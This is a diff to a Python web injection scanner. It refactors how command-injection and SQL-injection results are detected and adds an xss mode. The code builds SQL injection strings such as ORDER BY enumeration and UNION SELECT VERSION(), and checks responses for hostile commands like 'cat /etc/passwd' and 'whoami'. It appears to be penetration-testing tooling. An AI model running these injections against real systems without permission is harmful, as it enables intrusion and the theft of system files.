@@ -5,10 +5,12 @@ from datetime import datetime
 import itertools
 import re
 import click
+from classes.VulnerableResource import VulnerableResource
 
 def write_vulnerabilty_report(vulnerabilities_lines):
     """
     it writes text inside the output file. If the file and directories don't exist it creates them.
+
     :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
     """
 
@@ -21,86 +23,51 @@ def write_vulnerabilty_report(vulnerabilities_lines):
         for message in vulnerabilities_lines:
             f.write(f'{message}\n')
 
-def elaborate_response(http_method, url_under_test, parameters_and_values, response, vulnerabilities_lines, confirmation_data=None, extra_message=None):
+def is_parameter_vulnerable(parameter_value, url_under_test, response):
     """
-    it elaborates the response and checks for vulnerabilities. If a vulnerability is found then a new line will be saved to be written inside the output file.
-    :param http_method: HTTP metod
+    it establishes if a parameter is: vulnerable, seems vulnerable or not vulnerable.
+
+    :param parameter_value: value of the parameter under test
     :param url_under_test: server resource name
-    :param parameters_and_values: dictionary containing (parameter_name, paramater_value) as (key, value)
     :param response: HTTP response
-    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
-    :param confirmation_data: confirmation data used to confirm a vulnerability found using the number of columns command, None if the request wasn't a confirmation request
-    :param extra_message: details to append to the message, None if the request wasn't a confirmation request
-    :return: number of columns in a table if the ORDER BY command index is out of range, None otherwise
+    :return: enum with value: vulnerable, seems vulnerable or not vulnerable
     """
     
-    url_under_test = url_under_test[1:] # remove initial slash
+    # check expected results
+    if 'ls' in parameter_value:
+        if url_under_test in response.text:
+            return VulnerableResource.VULNERABLE
+    
+    if 'cat /etc/passwd' in parameter_value:
+        if 'root' in response.text:
+            return VulnerableResource.VULNERABLE
+    
+    if ('head' in parameter_value or 'grep php' in parameter_value) and '.php' in parameter_value:
+        if '<?php' in response.text:
+            return VulnerableResource.VULNERABLE
+    
+    if 'whoami' in parameter_value:
+        if CURRENT_USER in response.text:
+            return VulnerableResource.VULNERABLE
+    
+    if 'ifconfig | grep inet' in parameter_value:
+        if 'inet' in response.text:
+            return VulnerableResource.VULNERABLE
+    
+    # if the payload contais command to find the number of columns
+    if re.findall('[\'"1] ORDER BY \d+ -- -', parameter_value):
+        # response is empty if column number is out of range
+        if not response.text and 500 == response.status_code:
+            return VulnerableResource.SEEMS_VULNERABLE
 
-    if DEBUG:
-        if confirmation_data:
-            print('[DEBUG] - STARTING VULNERABILITY CONFIRMATION')
-
-        print(f'\n[DEBUG] - URL: {url_under_test}')
-        print(f'[DEBUG] - HTTP METHOD: {http_method}')
-        print(f'[DEBUG] - COMPLETE URL: {response.url}')
-        print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data if confirmation_data else parameters_and_values}')
-        
-        print('[DEBUG] - RESPONSE')
-        print(response.text)
-
-    number_of_columns = None
-
-    for parameter, value in parameters_and_values.items():
-        message = f'Found a command injection for URL: {url_under_test}, HTTP method: {http_method}, parameter: {parameter}, payload: {value}'
-
-        if extra_message:
-            message += extra_message
-        
-        # skip already checked combination
-        if message in vulnerabilities_lines:
-            continue
-
-        vulnerable = False
-
-        # if the request was a confirmation request
-        if confirmation_data:
-            vulnerable = len(re.findall('[\'"1] ORDER BY \d+ -- -', value)) > 0 # vulnerability is confirmed for each ORDER BY parameter value
-        else:
-            # check expected results
-            if 'ls' in value:
-                if url_under_test in response.text:
-                    vulnerable = True
-            elif 'cat /etc/passwd' in value:
-                if 'root' in response.text:
-                    vulnerable = True
-            elif ('head' in value or 'grep php' in value) and '.php' in value:
-                if '<?php' in response.text:
-                    vulnerable = True
-            elif 'whoami' in value:
-                if CURRENT_USER in response.text:
-                    vulnerable = True
-            elif 'ifconfig | grep inet' in value:
-                if 'inet' in response.text:
-                    vulnerable = True
-            elif re.findall('[\'"1] ORDER BY \d+ -- -', value): # if the payload contais command to find the number of columns
-                if not response.text and 500 == response.status_code: # response is empty if column number is out of range
-                    columns_number = int(re.findall('\d+', value)[-1])-1 # correct columns number = previous
-                    return columns_number
-
-        if vulnerable:
-            print(message)
-            vulnerabilities_lines.append(f'{datetime.now()} - {message}')
-
-    if DEBUG and confirmation_data:
-        print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')
-
-    return number_of_columns
+    return VulnerableResource.NOT_VULNERABLE
 
 def read_requests_details(requests_file, requests_dict):
     """
     it reads the requests details file and saves data inside a dictionary.
+
     :param requests_file: input file containing the details
-    :param requests_dict: dictionary containing the details
+    :param requests_dict: dictionary containing the list of requests to be performed
     """
     
     with open(requests_file) as f:
@@ -116,8 +83,9 @@ def read_requests_details(requests_file, requests_dict):
 def read_payloads(payloads_file, requests_dict):
     """
     it reads the payloads file and saves data inside a dictionary.
-    :param requests_file: input file containing the payloads
-    :param requests_dict: dictionary containing the details
+
+    :param payloads_file: input file containing the payloads
+    :param requests_dict: dictionary containing the list of requests to be performed
     :exception ValueError: if more payloads are specified and the payloads list contains the command to find the columns number
     :exception IndexError: if the length of the files is not the same
     """
@@ -129,7 +97,7 @@ def read_payloads(payloads_file, requests_dict):
             payloads = line.strip().split(PAYLOADS_SPLIT_VAL)
 
             # can't inject other payload with the command to find the columns number
-            if len(payloads) > 1 and payloads[i].startswith(COMMAND_COLUMNS_NUMBER):
+            if len(payloads) > 1 and COMMAND_COLUMNS_NUMBER == payloads[0]:
                 print(f'Only one payload can be injected with the {COMMAND_COLUMNS_NUMBER} command')
                 raise ValueError()
 
@@ -142,6 +110,7 @@ def read_payloads(payloads_file, requests_dict):
 def send_request(http_method, data, final_url):
     """
     it sends an HTTP request based on a specific HTTP method.
+
     :param http_method: HTTP metod
     :param data: data to be sent
     :param final_url: url containing target and resource
@@ -158,22 +127,50 @@ def send_request(http_method, data, final_url):
     print(f'Method {http_method} is not supported. Check your input file')
     raise ValueError
 
-def send_confirmation_request(original_request_data, number_of_columns, request_details, payloads_permutation, pre_union_value, vulnerabilities_lines):
+def prepare_data(request_parameters, payloads, custom_value=None):
+    """
+    it prepares data used in HTTP request.
+
+    :param request_parameters: list of parameters to be sent
+    :param payloads: list of payloads to inject
+    :param custom_value: if set, a custom value is inserted for specific parameters
+    :return: prepared data
+    """
+    
+    data = { }
+    
+    for i in range(len(request_parameters)):
+        if custom_value and COMMAND_COLUMNS_NUMBER == payloads[i]:
+            data[request_parameters[i]] = custom_value
+        else:
+            data[request_parameters[i]] = payloads[i]
+
+    return data
+
+def send_confirmation_request(vulnerable_parameter, injected_payload, number_of_columns, request_details, payloads, pre_union_value, vulnerabilities_lines):
     """
     it sends an HTTP request in order to confirm if a query is vulnerable. If the vulnerability is confirmed a new line will be saved to be written inside the output file.
-    :param original_request_data: data sent on the original request
+    
+    :param vulnerable_parameter: vulnerable parameter to be confirmed
+    :param injected_payload: vulnerable parameter payload
     :param number_of_columns: number of columns found by injecting the ORDER BY command
     :param request_details: details of the request
-    :param payloads_permutation: payloads to inject
+    :param payloads: payloads to inject
     :param pre_union_value: char to prepend to the UNION command
     :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
-    :return: true if the vulnerability is confirmed, false otherwise
+    :return: true if at least one vulnerability is confirmed (based on permutations), false otherwise
     """
 
     columns_values = ['VERSION()']
 
     for _ in range(1, number_of_columns): # skip a column, first one is replaced by the version command
         columns_values.append('NULL') # NULL allows to avoid type errors
+
+    if DEBUG:
+        print('\n[DEBUG] - STARTING VULNERABILITY CONFIRMATION')
+        print(f'[DEBUG] - HTTP METHOD: {request_details["method"]}')
+
+    is_vulnerability_confirmed = False
 
     # use set to remove repetitions
     for column_value in set(itertools.permutations(columns_values, number_of_columns)):
@@ -184,31 +181,38 @@ def send_confirmation_request(original_request_data, number_of_columns, request_
     
         confirmation_query = confirmation_query[:-2] # remove extra chars
 
-        confirmation_data = { }
-
-        for i in range(len(request_details['parameters'])):
-            if COMMAND_COLUMNS_NUMBER == payloads_permutation[i]:
-                confirmation_data[request_details['parameters'][i]] = f'{pre_union_value} {confirmation_query} -- -'
-            else:
-                confirmation_data[request_details['parameters'][i]] = payloads_permutation[i]
-
+        confirmation_data = prepare_data(request_details['parameters'], payloads, f'{pre_union_value} {confirmation_query} -- -')
         response = send_request(request_details['method'], confirmation_data, TARGET + request_details['url'])
+        
+        if DEBUG:
+            print(f'[DEBUG] - COMPLETE URL: {response.url}')
+            print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data}')
+            print('[DEBUG] - RESPONSE')
+            print(response.text)
 
-        if re.findall('\d.\d.[\d.]+', response.text): # if the response contains a version format string then the vulnerability is confirmed
-            extra_message = f'. The table has {number_of_columns} column(s)'
+        if re.findall('\d.\d.[\d.]+', response.text): # if the response contains a version format string then the vulnerability is confirmed            
+            is_vulnerability_confirmed = True
 
-            # use original data to write output file
-            elaborate_response(request_details['method'], request_details['url'], original_request_data, response, vulnerabilities_lines, confirmation_data, extra_message)
-            return True
+            message = f'Found a command injection for URL: {request_details["url"][1:]}, HTTP method: {request_details["method"]}, parameter: {vulnerable_parameter}, payload: {injected_payload}. The table has {number_of_columns} column(s)'
+            
+            print(message)
+            vulnerabilities_lines.append(f'{datetime.now()} - {message}')
 
-    return False
+        if is_vulnerability_confirmed:
+            break
 
-def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_run):
+    if DEBUG:
+        print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')
+        
+    return is_vulnerability_confirmed
+
+def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, run_mode):
     """
     it prepares data and send an HTTP request for cmd and sql mode.
-    :param requests_dict: dictionary containing the details
+
+    :param requests_dict: dictionary containing the list of requests to be performed
     :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
-    :param is_sql_run: boolean used to run the code in sql or cmd mode
+    :param run_mode: run mode [cmd, sql, xss]
     """
     
     for request in requests_dict:
@@ -233,16 +237,9 @@ def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_r
             # permutations of payloads based on parameters length
             for payload in set(itertools.permutations(request['payloads'], len(request['parameters']))):
                 # if payload contains the command to find the number of columns and the run is set to sql mode 
-                if noc_command_in_payloads and is_sql_run:
+                if noc_command_in_payloads and 'sql' == run_mode:
                     for pre_order_by_value in pre_order_by_values[:]: # loop over a copy of the list because elements can be removed
-                        data = { }
-                        
-                        for i in range(len(request['parameters'])):
-                            if COMMAND_COLUMNS_NUMBER == payload[i]:
-                                data[request['parameters'][i]] = f'{pre_order_by_value} ORDER BY {current_column_number} -- -'
-                            else:
-                                data[request['parameters'][i]] = payload[i]
-
+                        data = prepare_data(request['parameters'], payload, f'{pre_order_by_value} ORDER BY {current_column_number} -- -')
                         response = send_request(request['method'], data, final_url)
 
                         if 404 == response.status_code:
@@ -250,33 +247,50 @@ def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_r
                             end_loop = True
                             break
 
-                        number_of_columns = elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)
-
-                        # type or quotes error
-                        if 0 == number_of_columns:
-                            pre_order_by_values.remove(pre_order_by_value) # remove invalid char
-                        elif number_of_columns: # if the number of columns is found, send a confirmation request
-                            end_loop = send_confirmation_request(data, number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines)
+                        if DEBUG:
+                            print(f'\n[DEBUG] - URL: {request["url"][1:]}')
+                            print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
+                            print(f'[DEBUG] - COMPLETE URL: {response.url}')
+                            print(f'[DEBUG] - PARAMETERS AND VALUES: {data}')
                             
-                        # found and confirmed number of columns
-                        if end_loop:
-                            break
+                            print('[DEBUG] - RESPONSE')
+                            print(response.text)
+
+                        for i in range(len(request['parameters'])):
+                            if COMMAND_COLUMNS_NUMBER != payload[i]:
+                                continue
+
+                            if is_parameter_vulnerable(data[request['parameters'][i]] , request['url'][1:], response) == VulnerableResource.SEEMS_VULNERABLE:
+                                number_of_columns = int(re.findall('\d+', data[request['parameters'][i]])[-1])-1
+
+                                # if 0, char before ORDER BY 1 is not valid for the type used in query 
+                                if number_of_columns > 0:
+                                    # confirmation needed
+                                    end_loop = send_confirmation_request(request['parameters'][i], data[request['parameters'][i]], number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines)
+                                    break
                 else: # simply inject commands
-                    data = { }
-                    
-                    for i in range(len(request['parameters'])):
-                        data[request['parameters'][i]] = payload[i]
-                    
+                    data = prepare_data(request['parameters'], payload)                    
                     response = send_request(request['method'], data, final_url)
 
                     if 404 == response.status_code:
                         print(f'FILE NOT FOUND: {request["url"]}')
                         break
-                    
-                    elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)
 
-                if end_loop:
-                    break
+                    if DEBUG:
+                        print(f'\n[DEBUG] - URL: {request["url"][1:]}')
+                        print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
+                        print(f'[DEBUG] - COMPLETE URL: {response.url}')
+                        print(f'[DEBUG] - PARAMETERS AND VALUES: {data}')
+                        
+                        print('[DEBUG] - RESPONSE')
+                        print(response.text)
+                
+                    for i in range(len(request['parameters'])):
+                        if is_parameter_vulnerable(data[request['parameters'][i]] , request['url'][1:], response) == VulnerableResource.VULNERABLE:
+                            message = f'Found a command injection for URL: {request["url"][1:]}, HTTP method: {request["method"]}, parameter: {request["parameters"][i]}, payload: {data[request["parameters"][i]]}'
+            
+                            print(message)
+                            vulnerabilities_lines.append(f'{datetime.now()} - {message}')
 
             # found and confirmed number of columns
             if end_loop or not noc_command_in_payloads:
@@ -285,10 +299,13 @@ def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_r
             current_column_number += 1
 
 @click.command()
-@click.option('--mode', '-m', help='Injection mode [sql, cmd]', type=click.Choice(['sql', 'cmd']), required=True)
+@click.option('--mode', '-m', help='Injection mode [sql, cmd, xss]', type=click.Choice(['sql', 'cmd', 'xss']), required=True)
 @click.option('--irequests', '-r', help='Requests details file', required=True)
 @click.option('--ipayloads', '-p', help='Payloads file', required=True)
 def main(mode, irequests, ipayloads):
+    if DEBUG:
+        print(f'[DEBUG] - RUN MODE: {mode}')
+
     requests_dict = [ ]
 
     try:
@@ -301,7 +318,7 @@ def main(mode, irequests, ipayloads):
 
         vulnerabilities_lines = [ ]
 
-        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, 'sql' == mode)
+        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, mode)
         write_vulnerabilty_report(vulnerabilities_lines)
     except ValueError:
         exit()
